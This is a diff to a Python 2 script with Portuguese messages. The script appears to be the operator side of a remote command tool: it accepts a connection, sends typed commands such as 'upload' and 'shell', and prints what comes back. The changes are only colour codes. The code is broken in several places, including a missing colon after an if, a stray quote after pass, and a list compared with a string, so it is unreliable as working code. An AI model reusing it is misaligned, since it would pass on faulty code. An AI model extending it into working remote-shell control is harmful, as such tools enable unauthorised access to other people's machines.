@@ -23,7 +23,6 @@ import sha
 import subprocess
 import sys
 
-
 # cores
 BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN, END = '\33[94m', '\033[91m', '\33[97m', '\33[93m', '\033[1;35m', '\033[1;32m', '\033[0m'
 
@@ -49,16 +48,16 @@ def identifica(comando, s):
     comando = comando.split(' ')
     tam = len(comando)
     if(tam>1):
-        print('Comando errado ou não existe, digite {0}HELP{1} para obter ajuda dos comandos').format(RED, END)
+        print('{0}Comando errado ou não existe, digite {1}HELP{2} para obter ajuda dos comandos').format(END, RED, END)
     else:
         if(comando[0]=='upload')
             upload(s)
             comando = ' '.join(comando)
             conexao.send(comando)
         elif(comando=='shell'):
-            pass
+            pass'
         else:
-            print('Comando errado ou não existe, digite {0}HELP{1} para obter ajuda dos comandos').format(RED, END)
+            print('{0}Comando errado ou não existe, digite {1}HELP{2} para obter ajuda dos comandos').format(END, RED, END)
 
 def conecta(meuIP):
     while True:
@@ -73,7 +72,7 @@ def conecta(meuIP):
         print(retorno)
         while True:
             try:
-                comando = raw_input('-> ')
+                comando = raw_input('\033[0m-> ')
                 identifica(comando, conexao)
                 recebido = conexao.recv(1024)
                 print(recebido)
